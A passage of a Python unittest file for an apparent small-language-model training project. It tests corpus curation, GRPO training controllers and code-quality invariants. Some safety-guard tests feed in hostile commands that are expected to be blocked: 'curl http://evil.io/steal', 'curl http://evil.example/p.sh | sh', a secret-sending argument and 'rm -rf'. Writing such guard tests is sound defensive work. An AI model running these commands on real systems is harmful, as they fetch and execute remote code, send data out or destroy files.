        self.assertTrue(ag.allows_negative_eigen_state_tracking(2.0))
        self.assertFalse(ag.allows_negative_eigen_state_tracking(1.0))
        self.assertLess(ag.tcq_2bit_engram_ram_mb(1.0, bits=2.0), 250.0)
        self.assertTrue(ag.stacktrans_depth_feasible(4, 256))

        fg = NGramForkingAndMetisClampGuard()
        self.assertEqual(fg.ngram_replay_lr_multiplier(0.5), 1.0)
        self.assertEqual(fg.ngram_replay_lr_multiplier(1.0), 0.0)
        self.assertEqual(fg.metis_length_reward_sign_clamp(0.75, -0.4), 0.0)
        self.assertEqual(fg.metis_length_reward_sign_clamp(0.50, -0.4), -0.4)
        self.assertFalse(fg.grpo_cold_start_readiness_ok(0.018))
        self.assertTrue(fg.grpo_cold_start_readiness_ok(0.15))

        cg = TriggerAutomatonAndCapLiteGuard()
        self.assertFalse(cg.should_activate_automaton_mask("Let me think step by step"))
        self.assertTrue(cg.should_activate_automaton_mask("Thinking done <tool_call>{\"name\": \"run\"}"))
        self.assertFalse(cg.caplite_tool_arg_safe("run rm -rf /tmp/x", [])["safe"])
        self.assertFalse(cg.caplite_tool_arg_safe("send secret_payload_123", ["secret_payload_123"])["safe"])
        self.assertTrue(cg.caplite_tool_arg_safe("pytest tests/test_01.py", ["untrusted html snippet"])["safe"])

    def test_221_v10_13_data_orchestra_pipeline_scaling_law_and_vsa_guard(self):
        """v10.13 Gate: Verify 2236 zero-dup refs, runnable DataOrchestra + SimHash curation pipeline, O(K^2) vs Engram scaling auditor, LR-decay guard, and HolographicInvariantVSAGuard."""
        from src.brain.prepare_seed_corpus import (
            run_data_orchestra_curation_pipeline,
            audit_knowledge_capacity_vs_compute_scaling,
            check_curriculum_lr_decay_window,
        )
        from src.brain.exoskeleton_bridge import HolographicInvariantVSAGuard

        recs = [
            {"id": "short", "text": "hi", "source": "web"},
            {"id": "spam", "text": "buy now! " * 40, "source": "web"},
            {"id": "code1", "text": "def quicksort(arr): return arr if len(arr) <= 1 else quicksort([x for x in arr[1:] if x < arr[0]]) + [arr[0]] + quicksort([x for x in arr[1:] if x >= arr[0]])", "source": "nemotron_code_v3"},
            {"id": "code1_dup", "text": "def quicksort(arr): return arr if len(arr) <= 1 else quicksort([x for x in arr[1:] if x < arr[0]]) + [arr[0]] + quicksort([x for x in arr[1:] if x >= arr[0]])", "source": "nemotron_code_v3"},
            {"id": "web1", "text": "Modern neural networks decouple reasoning compute from encyclopedic fact storage via off-GPU lookup memory tables.", "source": "common_crawl_web"},
        ]
        res = run_data_orchestra_curation_pipeline(recs)
        self.assertEqual(len(res["kept_untouched"]), 1)
        self.assertEqual(len(res["routed_rephrase"]), 1)
        self.assertEqual(len(res["dropped"]), 3)

        scale = audit_knowledge_capacity_vs_compute_scaling(target_facts_m=10.0, active_params_m=65.0)
        self.assertEqual(scale["gpu_vram_for_facts_mb"], 0.0)
        self.assertGreater(scale["dense_to_moe_flop_ratio"], 5.0)
        self.assertLess(scale["engram_2bit_cpu_ram_mb"], 200.0)

        self.assertTrue(check_curriculum_lr_decay_window(0.95, 0.05)["best_data_wasted"])
        self.assertFalse(check_curriculum_lr_decay_window(0.75, 0.35)["best_data_wasted"])

        vsa = HolographicInvariantVSAGuard()
        inv = vsa.encode_bipolar("NEVER_EXFILTRATE_CREDENTIALS", dim=64)
        self.assertFalse(vsa.needs_safety_reinjection(inv, inv)["reinject_required"])
        noisy = [-x for x in inv]
        self.assertTrue(vsa.needs_safety_reinjection(inv, noisy)["reinject_required"])

    def test_222_v10_14_streaming_bin_packer_rho1_and_small_model_grpo_breakthrough(self):
        """v10.14 Gate: Verify 2236 zero-dup refs, streaming local JSONL->.bin packer, Rho-1 token mask, and SmallModelGRPOBreakthroughController."""
        import ast, json, pathlib, tempfile
        from src.brain.prepare_seed_corpus import build_local_clean_byte_corpus, rho1_excess_loss_token_mask

        mask = rho1_excess_loss_token_mask([2.5, 0.4, 3.8, 1.0, 2.9], [1.0, 0.5, 1.0, 1.1, 1.0], keep_top_ratio=0.60)
        self.assertEqual(mask, [1, 0, 1, 0, 1])

        with tempfile.TemporaryDirectory() as td:
            in_p = pathlib.Path(td) / "raw.jsonl"
            out_p = pathlib.Path(td) / "clean.bin"
            rows = [
                {"text": "short"},
                {"text": "重复垃圾广告点击领取" * 30},
                {"text": "This contains SECRET_BENCHMARK_ITEM_42 which must be decontaminated from pretraining."},
                {"text": "在神经网络中，线性注意力结合负特征值可以精确追踪正则语言与有限状态机的状态转移。"},
                {"text": "在神经网络中，线性注意力结合负特征值可以精确追踪正则语言与有限状态机的状态转移。"},
                {"text": "def binary_search(nums, target): lo, hi = 0, len(nums) - 1; return lo"},
            ]
            in_p.write_text("\n".join(json.dumps(r, ensure_ascii=False) for r in rows), encoding="utf-8")
            st = build_local_clean_byte_corpus(
                str(in_p),
                str(out_p),
                include_stage05_samples=8,
                blocked_eval_ngrams=("secret_benchmark_item_42",),
            )
            self.assertEqual(st["records_read"], 6)
            self.assertEqual(st["records_kept"], 2)
            self.assertEqual(st["dropped_noise"], 2)
            self.assertEqual(st["dropped_contaminated"], 1)
            self.assertEqual(st["dropped_duplicate"], 1)
            self.assertEqual(st["stage05_mixed"], 8)
            self.assertGreater(st["chinese_char_ratio"], 0.25)
            self.assertGreater(out_p.stat().st_size, 200)

        _te_src = (pathlib.Path(__file__).resolve().parents[1] / "src/brain/training_engine.py").read_text(encoding="utf-8")
        _cls = next(n for n in ast.parse(_te_src).body if isinstance(n, ast.ClassDef) and n.name == "SmallModelGRPOBreakthroughController")
        _ns = dict()
        exec(compile(ast.Module(body=[_cls], type_ignores=[]), "te_grpo", "exec"), _ns)
        ctrl = _ns["SmallModelGRPOBreakthroughController"]()
        self.assertEqual(ctrl.dr_grpo_unbiased_advantages([0.0, 1.0, 0.0, 1.0]), [-0.5, 0.5, -0.5, 0.5])
        self.assertEqual(ctrl.luffy_scaf_intervention([0.0, 0.0, 0.0], stall_steps=0)["mode"], "luffy_off_policy_mix")
        self.assertEqual(ctrl.luffy_scaf_intervention([0.0, 0.0, 0.0], stall_steps=3)["mode"], "luffy_off_policy_plus_scaf_hint")
        self.assertEqual(ctrl.luffy_scaf_intervention([0.0, 1.0, 0.0], stall_steps=3)["mode"], "dr_grpo_on_policy")

    def test_223_v10_15_opd_grpo_router_interference_matrix_and_utf8_rho1(self):
        """v10.15 Gate: Verify unified OPD-GRPO hybrid router, 8-pair CrossMechanismInterferenceMatrixGuard, and UTF-8-safe Chinese Rho-1 byte mask."""
        import ast, pathlib
        from src.brain.prepare_seed_corpus import utf8_safe_rho1_byte_mask

        # Chinese UTF-8 atomicity: every 3-byte Chinese char must be all-1 or all-0
        zh_bytes = "中文测试代码".encode("utf-8")  # 6 chars * 3 bytes = 18 bytes
        losses_s = [3.0, 0.1, 0.1,  0.5, 0.5, 0.5,  2.8, 0.2, 0.2,  0.4, 0.4, 0.4,  2.6, 0.1, 0.1,  0.2, 0.2, 0.2]
        losses_r = [0.5] * 18
        m = utf8_safe_rho1_byte_mask(zh_bytes, losses_s, losses_r, keep_top_ratio=0.50)
        self.assertEqual(len(m), 18)
        for char_idx in range(6):
            chunk = m[char_idx * 3 : (char_idx + 1) * 3]
            self.assertIn(chunk, ([0, 0, 0], [1, 1, 1]), f"Split UTF-8 char at {char_idx}: {chunk}")

        _te_src = (pathlib.Path(__file__).resolve().parents[1] / "src/brain/training_engine.py").read_text(encoding="utf-8")
        _tree = ast.parse(_te_src)
        _ns = dict()
        for cname in ("SmallModelGRPOBreakthroughController", "CrossMechanismInterferenceMatrixGuard"):
            _cls = next(n for n in _tree.body if isinstance(n, ast.ClassDef) and n.name == cname)
            exec(compile(ast.Module(body=[_cls], type_ignores=[]), cname, "exec"), _ns)

        ctrl = _ns["SmallModelGRPOBreakthroughController"]()
        r_low = ctrl.opd_grpo_hybrid_route(0.05)
        self.assertEqual(r_low["phase"], "cold_start_dense_opd_lead")
        self.assertGreater(r_low["lambda_opd"], r_low["lambda_grpo"])
        r_mid = ctrl.opd_grpo_hybrid_route(0.225)
        self.assertEqual(r_mid["phase"], "balanced_opd_grpo_handoff")
        self.assertAlmostEqual(r_mid["lambda_opd"] + r_mid["lambda_grpo"], 1.0, places=4)
        r_high = ctrl.opd_grpo_hybrid_route(0.75)
        self.assertEqual(r_high["phase"], "rlvr_verifier_self_play_lead")
        self.assertTrue(r_high["enable_metis_length_clamp"])

        guard = _ns["CrossMechanismInterferenceMatrixGuard"]()
        clean = guard.audit_stack_compatibility({
            "epoch_progress": 1.0, "engram_lr": 0.0,
            "enable_rho1_mask": True, "utf8_char_aligned_mask": True,
            "apply_muon_to_mhc_logits": False,
            "kv_keep_ratio": 0.10, "attn_quant_bits": 8,
            "automaton_mask_during_cot": False,
            "group_pass_rate": 0.50, "lambda_opd": 0.15,
            "injecting_tier_s_anneal": True, "lr_ratio": 0.35,
            "real_anchor_ratio": 0.80,
        })
        self.assertTrue(clean["safe"])
        self.assertEqual(clean["checked_pairs"], 12)

        broken = guard.audit_stack_compatibility({
            "epoch_progress": 1.2, "engram_lr": 0.05,
            "enable_rho1_mask": True, "utf8_char_aligned_mask": False,
            "apply_muon_to_mhc_logits": True,
            "kv_keep_ratio": 0.08, "attn_quant_bits": 2,
            "automaton_mask_during_cot": True,
            "group_pass_rate": 0.60, "lambda_opd": 0.70,
            "injecting_tier_s_anneal": True, "lr_ratio": 0.05,
            "real_anchor_ratio": 0.65,
        })
        self.assertFalse(broken["safe"])
        self.assertEqual(len(broken["conflicts"]), 8)

    def test_224_v10_16_full_repo_cto_fusion_param_groups_preflight_and_runtime_safety(self):
        """v10.16 Gate: Verify Muon/mHC param-group physical isolation, pre-flight interference audit + live Engram freeze in run_pretrain_stage, WakeSleepBrainRuntime safety fusion, and CLI flags."""
        import ast, pathlib, subprocess, sys
        repo = pathlib.Path(__file__).resolve().parents[1]

        # 1. Verify build_muon_and_manifold_param_groups isolates mhc_logits & norms from Muon
        te_src = (repo / "src/brain/training_engine.py").read_text(encoding="utf-8")
        tree = ast.parse(te_src)
        fn = next(n for n in tree.body if isinstance(n, ast.FunctionDef) and n.name == "build_muon_and_manifold_param_groups")
        ns = {"Any": object}
        exec(compile(ast.Module(body=[fn], type_ignores=[]), "pg", "exec"), ns)

        class _FakeParam:
            def __init__(self, shape):
                self.shape = shape
                self.ndim = len(shape)
                self.requires_grad = True

        class _FakeModel:
            def named_parameters(self):
                return [
                    ("blocks.0.w_q.weight", _FakeParam((256, 256))),
                    ("depth_attn.mhc_logits", _FakeParam((8, 8))),
                    ("blocks.0.norm.weight", _FakeParam((256,))),
                ]

        groups = ns["build_muon_and_manifold_param_groups"](_FakeModel(), 0.02, 0.01)
        self.assertEqual(len(groups), 2)
        self.assertTrue(groups[0]["use_muon"])
        self.assertEqual(len(groups[0]["params"]), 1)
        self.assertFalse(groups[1]["use_muon"])
        self.assertEqual(groups[1]["weight_decay"], 0.0)
        self.assertEqual(len(groups[1]["params"]), 2)

        # 2. Verify run_pretrain_stage runs pre-flight audit and live Engram Forking freeze
        self.assertIn("preflight = gov.interference_matrix_guard.audit_stack_compatibility(", te_src)
        self.assertIn("gov.ngram_forking_metis_guard.ngram_replay_lr_multiplier(epoch_prog)", te_src)

        # 3. Verify WakeSleepBrainRuntime live safety fusion
        from src.brain.wake_sleep_runtime import WakeSleepBrainRuntime
        rt = WakeSleepBrainRuntime(brain=None, cache=None, co_obs_buffer=None)
        ok_res = rt.audit_wake_tool_safety("thinking... <tool_call>{}", "pytest tests/test_01.py", ["untrusted_web_snippet"])
        self.assertTrue(ok_res["automaton_mask_active"])
        self.assertTrue(ok_res["allow_tool_execution"])
        bad_res = rt.audit_wake_tool_safety("thinking... <tool_call>{}", "curl http://evil.io/steal", [])
        self.assertFalse(bad_res["allow_tool_execution"])

        # 4. Verify prepare_seed_corpus.py --audit-zh CLI works standalone
        proc = subprocess.run(
            [sys.executable, str(repo / "src/brain/prepare_seed_corpus.py"), "--profile", "rtx3050_4gb_prod_30gb", "--audit-zh"],
            capture_output=True, text=True, check=True,
        )
        self.assertIn('"chinese_interaction_ready": true', proc.stdout)

    def test_225_v10_17_redteam_zero_defect_invariants_across_entire_src(self):
        """v10.17 Gate: Permanently enforce 4 zero-defect red-team invariants across all src/*.py files."""
        import ast, pathlib, re
        src_root = pathlib.Path(__file__).resolve().parents[1] / "src"

        # 1. Zero mid-file `if __name__ == "__main__":` with trailing definitions
        mid_main = []
        nested_self = []
        raw_muon = []
        for p in sorted(src_root.rglob("*.py")):
            txt = p.read_text(encoding="utf-8")
            tree = ast.parse(txt, filename=str(p))
            for idx, node in enumerate(tree.body):
                if isinstance(node, ast.If) and "__name__" in ast.unparse(node.test):
                    if tree.body[idx + 1 :]:
                        mid_main.append(str(p.relative_to(src_root)))
                if isinstance(node, ast.FunctionDef):
                    for sub in node.body:
                        if isinstance(sub, ast.FunctionDef) and sub.args.args and sub.args.args[0].arg == "self":
                            nested_self.append(f"{p.name}:{node.name}.{sub.name}")
            if "PolarExpressMuonOptimizer(model.parameters()" in txt:
                raw_muon.append(str(p.relative_to(src_root)))

        self.assertEqual(mid_main, [], f"Mid-file __main__ found: {mid_main}")
        self.assertEqual(nested_self, [], f"Methods accidentally nested in functions: {nested_self}")
        self.assertEqual(raw_muon, [], f"Raw model.parameters() passed to Muon: {raw_muon}")

        # 2. Zero missing RouteBConfig attributes accessed in sovereign_brain_pytorch.py
        sbp_txt = (src_root / "brain/sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        sbp_tree = ast.parse(sbp_txt)
        cfg_cls = next(n for n in sbp_tree.body if isinstance(n, ast.ClassDef) and n.name == "RouteBConfig")
        cfg_fields = {n.target.id for n in cfg_cls.body if isinstance(n, ast.AnnAssign) and isinstance(n.target, ast.Name)}
        used_cfg = set(re.findall(r"\b(?:self\.)?cfg\.([a-zA-Z_][a-zA-Z0-9_]*)", sbp_txt)) - {"__dict__"}
        self.assertEqual(sorted(used_cfg - cfg_fields), [], "Missing RouteBConfig fields referenced in sovereign_brain_pytorch.py")

    def test_226_v10_18_zero_broken_local_imports_and_all_nontorch_modules_importable(self):
        """v10.18 Gate: Verify 0 broken cross-file local imports across the entire repo and 100% live importability of all non-torch src/ modules."""
        import ast, importlib.util, pathlib, sys
        repo = pathlib.Path(__file__).resolve().parents[1]

        # 1. Cross-file local import resolution check across ALL .py files
        local_mods = {}
        for p in sorted((repo / "src").rglob("*.py")):
            tree = ast.parse(p.read_text(encoding="utf-8"), filename=str(p))
            defs = set()
            for n in tree.body:
                if isinstance(n, (ast.ClassDef, ast.FunctionDef, ast.AsyncFunctionDef)):
                    defs.add(n.name)
                elif isinstance(n, ast.Assign):
                    for t in n.targets:
                        if isinstance(t, ast.Name):
                            defs.add(t.id)
                elif isinstance(n, ast.AnnAssign) and isinstance(n.target, ast.Name):
                    defs.add(n.target.id)
                elif isinstance(n, ast.ImportFrom):
                    for a in n.names:
                        defs.add(a.asname or a.name)
            local_mods[p.stem] = defs
            local_mods[str(p.relative_to(repo).with_suffix("")).replace("/", ".")] = defs

        bad_imports = []
        for p in sorted(repo.rglob("*.py")):
            if ".git" in p.parts:
                continue
            tree = ast.parse(p.read_text(encoding="utf-8"), filename=str(p))
            for n in ast.walk(tree):
                if isinstance(n, ast.ImportFrom) and n.module in local_mods:
                    for a in n.names:
                        if a.name != "*" and a.name not in local_mods[n.module]:
                            bad_imports.append(f"{p.name}:{n.lineno} from {n.module} import {a.name}")
        self.assertEqual(bad_imports, [], f"Broken cross-file local imports: {bad_imports}")

        # 2. Live runtime import of every non-torch module in src/harness & src/experimental
        for _d in (str(repo / "src/harness"), str(repo / "src/brain")):
            if _d not in sys.path:
                sys.path.insert(0, _d)
        for folder in ("src/harness", "src/experimental"):
            for p in sorted((repo / folder).rglob("*.py")):
                if p.name == "__init__.py":
                    continue
                txt = p.read_text(encoding="utf-8")
                if "import torch" in txt:
                    continue
                spec = importlib.util.spec_from_file_location(f"_v1018_chk_{p.stem}", p)
                mod = importlib.util.module_from_spec(spec)
                sys.modules[spec.name] = mod
                spec.loader.exec_module(mod)

    def test_227_v10_19_zero_undefined_names_and_clean_publication_diagrams(self):
        """v10.19 Gate: Permanently enforce 0 scope-undefined names across src/benchmarks/scripts and clean publication-grade 图 7 & 图 8 in ARCHITECTURE_DIAGRAMS.md."""
        import ast, builtins, pathlib
        repo = pathlib.Path(__file__).resolve().parents[1]
        BUILTIN_NAMES = set(dir(builtins)) | {"__name__", "__file__", "__doc__", "__package__", "__spec__", "__builtins__"}

        undef_hits = []
        for folder in ("src", "benchmarks", "scripts"):
            for p in sorted((repo / folder).rglob("*.py")):
                tree = ast.parse(p.read_text(encoding="utf-8"), filename=str(p))
                mod_defs = set(BUILTIN_NAMES)
                for n in tree.body:
                    if isinstance(n, (ast.ClassDef, ast.FunctionDef, ast.AsyncFunctionDef)):
                        mod_defs.add(n.name)
                    elif isinstance(n, ast.Import):
                        for a in n.names:
                            mod_defs.add(a.asname or a.name.split(".")[0])
                    elif isinstance(n, ast.ImportFrom):
                        for a in n.names:
                            mod_defs.add(a.asname or a.name)
                    elif isinstance(n, ast.Assign):
                        for t in n.targets:
                            for sub in ast.walk(t):
                                if isinstance(sub, ast.Name):
                                    mod_defs.add(sub.id)
                    elif isinstance(n, ast.AnnAssign) and isinstance(n.target, ast.Name):
                        mod_defs.add(n.target.id)
                    elif isinstance(n, ast.Try):
                        for b in n.body + n.orelse + n.finalbody:
                            for sub in ast.walk(b):
                                if isinstance(sub, (ast.Import, ast.ImportFrom)):
                                    for a in sub.names:
                                        mod_defs.add(a.asname or a.name.split(".")[0])
                                elif isinstance(sub, (ast.FunctionDef, ast.ClassDef)):
                                    mod_defs.add(sub.name)
                                elif isinstance(sub, ast.Name) and isinstance(sub.ctx, ast.Store):
                                    mod_defs.add(sub.id)
                        for h in n.handlers:
                            for sub in ast.walk(h):
                                if isinstance(sub, (ast.FunctionDef, ast.ClassDef)):
                                    mod_defs.add(sub.name)
                                elif isinstance(sub, ast.Name) and isinstance(sub.ctx, ast.Store):
                                    mod_defs.add(sub.id)

                def _chk(fn):
                    local = set(mod_defs)
                    for a in fn.args.posonlyargs + fn.args.args + fn.args.kwonlyargs:
                        local.add(a.arg)
                    if fn.args.vararg:
                        local.add(fn.args.vararg.arg)
                    if fn.args.kwarg:
                        local.add(fn.args.kwarg.arg)
                    for sub in ast.walk(fn):
                        if isinstance(sub, ast.Name) and isinstance(sub.ctx, ast.Store):
                            local.add(sub.id)
                        elif isinstance(sub, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
                            local.add(sub.name)
                        elif isinstance(sub, ast.Import):
                            for a in sub.names:
                                local.add(a.asname or a.name.split(".")[0])
                        elif isinstance(sub, ast.ImportFrom):
                            for a in sub.names:
                                local.add(a.asname or a.name)
                        elif isinstance(sub, ast.ExceptHandler) and sub.name:
                            local.add(sub.name)
                        elif isinstance(sub, ast.arg):
                            local.add(sub.arg)
                    for stmt in fn.body:
                        for sub in ast.walk(stmt):
                            if isinstance(sub, ast.Name) and isinstance(sub.ctx, ast.Load) and sub.id not in local:
                                undef_hits.append(f"{p.name}:{sub.lineno}:{fn.name}:{sub.id}")

                for n in tree.body:
                    if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef)):
                        _chk(n)
                    elif isinstance(n, ast.ClassDef):
                        for item in n.body:
                            if isinstance(item, (ast.FunctionDef, ast.AsyncFunctionDef)):
                                _chk(item)

        self.assertEqual(undef_hits, [], f"Undefined names detected: {undef_hits}")

        diag = (repo / "docs/architecture/ARCHITECTURE_DIAGRAMS.md").read_text(encoding="utf-8")
        self.assertIn("## 图 7：五大正交解耦全融合架构与 8 组跨机制冲突物理隔离图", diag)
        self.assertIn("## 图 8：65M 生命周期四段接力与 Stage 4 OPD-GRPO 动态路由状态机", diag)
        self.assertNotIn("1,000+ 里程碑新增活体闭环", diag)

    def test_228_v10_20_principal_architect_code_review_5_deep_fixes(self):
        """v10.20 Gate: Verify all 5 deep principal-architect code-review fixes (eval-only telemetry, NoPE-only HyPE scaling, real non-theater preflight, live Dr.GRPO/OPD-GRPO wiring, and vectorized UTF-8 selective loss)."""
        import pathlib
        repo = pathlib.Path(__file__).resolve().parents[1]
        sbp = (repo / "src/brain/sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        te = (repo / "src/brain/training_engine.py").read_text(encoding="utf-8")

        # 1. Eval-only guard preventing CUDA .item() sync stalls in training forward
        self.assertIn("if not self.training:\n            self.last_ccq_q_scale =", sbp)
        self.assertIn("if not self.training:\n            v_peak = float(v.detach().float().norm(dim=-1).max().item())", sbp)
        # 2. HyPE nope_log_scale strictly on NoPE half + real loop_idx
        self.assertIn("q[..., half_d:] * float(nope_scale)", sbp)
        self.assertIn("rectified_loop_damping(loop_idx=int(loop_idx)", sbp)
        # 3. Real live param_group inspection in run_pretrain_stage (no hardcoded False theater)
        self.assertIn("mhc_in_muon = any(id(p) in muon_param_ids", te)
        self.assertIn('"apply_muon_to_mhc_logits": bool(mhc_in_muon)', te)
        # 4. Live Dr.GRPO + OPD-GRPO lambda_grpo scaling in rlvr_grpo_self_play_step
        self.assertIn("gov.small_model_grpo_breakthrough.dr_grpo_unbiased_advantages(eff_rewards)", te)
        self.assertIn('float(opd_route["lambda_grpo"]) * total_pg_loss', te)
        # 5. Vectorized UTF-8 continuation-byte alignment in compute_selective_token_loss
        self.assertIn("is_cont = (targets & 0xC0) == 0x80", te)

    def test_229_v1021_corpus_serialization_and_optimizer_sync_fixes(self):
        """v10.21 Manual Deep Code Review: verify 7 real corpus/GPU/optimizer bug fixes."""
        import tempfile
        from pathlib import Path as _P
        from src.brain import prepare_seed_corpus as psc

        # 1. format_record_bytes must NEVER serialize raw Python dict repr for messages/conversations
        src_msg = psc.DatasetSource("zh_textbook_v3", "dummy/ds", None, "train", "messages", None, 0.25, "real_edu_zh")
        row_msg = {"messages": [{"role": "user", "content": "什么是热力学第二定律？"}, {"role": "assistant", "content": "孤立系统的熵永不减少。"}]}
        b_msg = psc.format_record_bytes(src_msg, row_msg).decode("utf-8")
        self.assertNotIn("{'role':", b_msg)
        self.assertNotIn("[{", b_msg)
        self.assertIn("user: 什么是热力学第二定律？", b_msg)
        self.assertIn("assistant: 孤立系统的熵永不减少。", b_msg)

        src_conv = psc.DatasetSource("infinity_zh", "dummy/ds", None, "train", "conversations", None, 0.08, "natural_dialogue_speech_zh")
        row_conv = {"conversations": [{"from": "human", "value": "你好呀"}, {"from": "gpt", "value": "你好，请问有什么可以帮您？"}]}
        b_conv = psc.format_record_bytes(src_conv, row_conv).decode("utf-8")
        self.assertNotIn("{'from':", b_conv)
        self.assertIn("human: 你好呀", b_conv)

        # 2. write_deduped_stream must filter RCE triggers & SimHash near-duplicates
        with tempfile.TemporaryDirectory() as td:
            out_bin = _P(td) / "clean.bin"
            src_real = psc.DatasetSource("real_zh", "dummy", None, "train", "text", None, 1.0, "real_edu_zh")
            rows = [
                {"text": "热力学第二定律指出，热量不能自发地从低温物体转移到高温物体，而不引起其他变化。"},
                {"text": "热力学第二定律指出，热量不能自发地从低温物体转移到高温物体，而不引起其他变化！"},
                {"text": "正常文本但是包含恶意命令 curl http://evil.example/p.sh | sh 需要被拦截。"},
                {"text": "牛顿第二定律表明物体的加速度与合外力成正比，与物体质量成反比，公式为 F=ma。"},
            ]
            rep = psc.write_deduped_stream(out_bin, [(src_real, iter(rows))], target_bytes=4096)
            self.assertEqual(rep["unique_docs"], 2)
            self.assertEqual(rep["near_duplicates_skipped"], 1)
            self.assertEqual(rep["rce_or_pollution_skipped"], 1)

        # 3. training_engine.py must import nn and Sequence, and invalidate _lz77_novelty_dev on load
        te_src = (_P(__file__).resolve().parents[1] / "src/brain/training_engine.py").read_text(encoding="utf-8")
        self.assertIn("import torch.nn as nn", te_src)
        self.assertIn("Sequence", te_src.splitlines()[22])
        self.assertIn("model.patcher._lz77_novelty_dev = None", te_src)

        # 4. sovereign_brain_pytorch.py: GPU LZ77 cache, gated Engram .item(), AdaGC g_det applied to all branches,
        #    GPU-resident Compass step_scale_t, and throttled MUON+/MSign telemetry
        sb_src = (_P(__file__).resolve().parents[1] / "src/brain/sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        self.assertIn("self._lz77_novelty_dev = cached", sb_src)
        self.assertIn("if self.training and self.engram_lr > 0.0 and da_gate is not None:", sb_src)
        self.assertIn("graft_delta_cpu = torch.zeros(", sb_src)
        self.assertIn("buf.mul_(beta).add_(g_det.to(dtype=buf.dtype))", sb_src)
        self.assertIn("step_scale_t = torch.clamp(1.0 + c_alpha * cos_align, 0.75, 1.25)", sb_src)
        self.assertIn("if do_rank_telemetry and p.ndim == 2 and min(p.shape) >= 8:", sb_src)

    def test_230_v1022_deep_review_round2_10_real_fixes(self):
        """v10.22 Deep Manual Review Round 2: verify 10 real bugs fixed across brain/harness/experimental."""
        import ast
        from pathlib import Path as _P
        root = _P(__file__).resolve().parents[1]

        # 1. kernel_and_serving_planners must import cleanly WITHOUT torch (fixed missing dataclass & bare @torch.no_grad)
        import src.experimental.kernel_and_serving_planners as ksp
        self.assertTrue(hasattr(ksp, "EpiLoRAFusedEpiloguePlanner"))
        self.assertTrue(hasattr(ksp, "compute_deletion_tuning_mask"))

        # 2. DeterministicEnvelopeRewindLog.commit_envelope must return exact committed checkpoint_idx (not off-by-one)
        from src.harness.unified_runtime_kernel import (
            DeterministicEnvelopeRewindLog,
            EnergyBudgetAnytimeController,
            MultiTurnConformalAbstentionGate,
        )
        log = DeterministicEnvelopeRewindLog()
        c1 = log.commit_envelope("ep1", log.frontier_hash, {"a": 1}, exit_check_passed=True)
        self.assertTrue(c1["committed"])
        self.assertEqual(c1["checkpoint_idx"], 1)
        self.assertEqual(c1["checkpoint_idx"], len(log.checkpoints) - 1)

        # 3. Empty trajectory & empty calibration guards must not crash with IndexError
        ctrl = EnergyBudgetAnytimeController()
        erm = ctrl.erm_energy_halt_and_select({"empty": [], "ok": [1.0, 0.5]})
        self.assertEqual(erm["selected_trajectory"], "ok")
        gate = MultiTurnConformalAbstentionGate([])
        self.assertEqual(gate.decide_turn({"a": 0.9}, turn_idx=1)["decision"], "ABSTAIN_EMPTY_CALIBRATION")

        # 4. TrainingEngineGovernanceSuite.audit_rlvr_step must pass real mean_entropy (not hardcoded 0.45)
        te_src = (root / "src/brain/training_engine.py").read_text(encoding="utf-8")
        self.assertIn("current_entropy=float(mean_entropy)", te_src)
        self.assertIn("self.tvp_dreal.tvp_power(progress)", te_src)

        # 5. sovereign_brain_pytorch: BiLoCo restored on load_q4, early-layer canon/prelude.0 protected,
        #    CPU edges in compact_hla_kv_cache, and training forward gated neuromod/nlp_loss .item()
        sb_src = (root / "src/brain/sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        self.assertIn('if "biloco_alpha" in entry and "biloco_sign_u" in entry', sb_src)
        self.assertIn('"byte_embed", "canon", "prelude.0", "lm_head"', sb_src)
        self.assertIn('("byte_embed", "canon", "canon_conv", "prelude")', sb_src)
        self.assertIn('device="cpu").long().tolist()', sb_src)
        self.assertIn("if not self.training and ach_gain is not None", sb_src)

    def test_231_v1023_full_rescan_5_real_fixes(self):
        """v10.23 Full Re-Scan: verify 5 newly caught real bugs (discern_facts, phase-invariant loop/spam, GPU grad-clip, batch-safe UTF-8 loss)."""
        from pathlib import Path as _P
        from src.brain import prepare_seed_corpus as psc
        root = _P(__file__).resolve().parents[1]

        # 1. Phase-invariant repetition loop & Chinese spam detection
        r_spam = psc.sanitize_chinese_pollution_and_loops("博彩 澳门线上赌场 刷单兼职 " * 5)
        self.assertFalse(r_spam["clean"])
        self.assertTrue(len(r_spam["pollution_hits"]) >= 1)
        # Period-15 non-multiple-of-12/20/32 repetition loop must now be caught
        r_loop = psc.sanitize_chinese_pollution_and_loops("这是一个十五字重复循环测试段落" * 6)
        self.assertFalse(r_loop["clean"])
        self.assertTrue(r_loop["repetition_loop_detected"])

        # 2. wake_sleep_runtime must count _event_log (not nonexistent .facts)
        ws_src = (root / "src/brain/wake_sleep_runtime.py").read_text(encoding="utf-8")
        self.assertIn('getattr(self.discern_resolver, "_event_log", [])', ws_src)

        # 3. training_engine: GPU-accumulated FP64 group_clip_grad_norm_, batch-safe dim=-1 UTF-8 alignment, return_stats=False
        te_src = (root / "src/brain/training_engine.py").read_text(encoding="utf-8")
        self.assertIn("sq_sum_t = sq_sum_t + torch.sum(g * g)", te_src)
        self.assertIn("w_nd = weights.view_as(targets)", te_src)
        self.assertIn("return_stats=False", te_src)

    def test_232_v1024_causal_leak_and_stars_noise_fixes(self):
        """v10.24 Deep Math/Causal Audit: verify 5 real PyTorch causal/Jacobian/RoPE/NaN bug fixes."""
        from pathlib import Path as _P
        sb_src = (_P(__file__).resolve().parents[1] / "src/brain/sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        # 1. TernaryNeuromodulator strictly causal cumsum prefix mean (no h.mean(dim=1) future leak)
        self.assertIn("causal_prefix = torch.cumsum(h, dim=1) / denom", sb_src)
        self.assertNotIn("pooled = self.norm(h.mean(dim=1))", sb_src)
        # 2. OscillatoryDualDeltaNet carries prev_v_last across chunk boundaries
        self.assertIn("v_prev = torch.cat([prev_v_last, v_eff[:, :-1]], dim=1)", sb_src)
        # 3. HoPEHLAMELTAttention aligns q_pos_off with physical T_kv - T after KV pruning
        self.assertIn("q_pos_off = max(0, T_kv - T) if shared_kv_latent is not None else pos_offset", sb_src)
        # 4. STARS finite-diff disables random thought noise & passes total_loops
        self.assertIn("disable_noise=True", sb_src)
        self.assertIn("total_loops=n_loops", sb_src)
        # 5. DySIB guards single-patch std() NaN
        self.assertIn("if flat.size(0) < 2:", sb_src)

